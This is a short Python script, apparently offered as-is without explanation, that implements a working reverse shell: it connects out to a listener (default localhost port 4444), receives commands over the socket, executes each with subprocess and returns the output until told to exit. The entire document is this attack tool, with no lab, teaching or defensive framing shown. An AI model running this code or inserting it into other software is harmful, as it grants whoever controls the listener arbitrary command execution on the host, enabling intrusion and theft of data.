import socket
import subprocess

def reverse_shell(host='127.0.0.1', port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == 'exit':
            break
        
        output = subprocess.getoutput(cmd)
        s.send(output.encode())

if __name__ == "__main__":
    reverse_shell()
